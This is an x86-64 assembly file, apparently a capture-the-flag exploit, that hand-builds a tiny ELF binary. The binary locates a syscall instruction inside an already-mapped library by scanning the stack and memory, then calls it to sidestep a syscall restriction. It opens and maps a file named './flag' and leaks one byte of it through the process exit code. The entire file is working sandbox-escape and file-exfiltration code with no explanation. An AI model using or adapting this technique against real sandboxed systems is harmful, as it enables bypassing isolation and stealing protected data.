[bits 64]

file_load_va: equ 0x3410000000

; ELF header

; Signature
db 0x7f, 'E', 'L', 'F'
db 1
db 1
db 1
db 0
dq 0
dw 2
dw 0x3e
dd 1
dq entry_point + file_load_va
dq 0x40
dq 0x0100000034
dd 0
dw 0x40
dw 0x38
dw 1
dw 0
dw 0
dw 0

program_headers_start:
dd 1
dd 5
dq 0
dq file_load_va
dq file_load_va
dq file_end
dq file_end
dq 0x1000


entry_point:
    push rbp
    mov rbp, rsp
    sub rsp, 0x30
    xor eax, eax
    lea rax, [rbp - 0x30]
    mov [rbp - 0x28], rax
    add qword [rbp - 0x28], 8
    mov rax, [rbp - 0x28]
    mov rax, [rax]
    shr rax, 0x28
    cmp rax, 0x7f
    jnz $-0x14

    mov rax, [rbp - 0x28]
    mov rax, [rax]
    and eax, 0xfff
    test rax, rax
    jnz $-0x25

    mov rax, qword [rbp - 0x28]
    mov rax, qword [rax]
    mov qword [rbp - 0x10], 0
    add qword [rbp - 0x10], 1

    add    rax, 1
    mov    [rbp-0x20], rax
    mov rax, [rbp-0x20]
    mov dl, byte [rax]
    cmp dl, 0xf
    jnz $-0x11
    add rax, 1
    mov dl, byte [rax]
    cmp dl, 0x5
    jnz $-0x18
    cmp qword  [rbp-0x10], 4
    jnz $-0x28

    sub rax, 1
    mov    [rbp-0x18], rax

    mov    rdi, 0x1337331000
    mov    rsi, 0x1000
    mov    rdx, 2
    mov    r10, 0x32
    mov    r8, -1
    mov    r9, 0
    mov    rax, 9
    call    [rbp-0x18]


    mov    rax, 0x67616c662f2e
    mov rdi, 0x1337331000
    mov    qword [rdi+0x337], rax

    mov rax, 2
    mov rdi, 0x1337331337
    mov rsi, 0
    call    [rbp-0x18]

    mov    rdi, 0x41000
    mov    rsi, 0x1000
    mov    rdx, 2
    mov r10, 0x12
    mov r8, 3
    mov r9, 0
    mov rax, 9
    call    [rbp-0x18]


    mov    rax, 60
    ;mov    dil, 0x10
    mov dil, byte [0x41000+7]
    call [rbp-0x18]

    jmp    $+0
code_end:

file_end: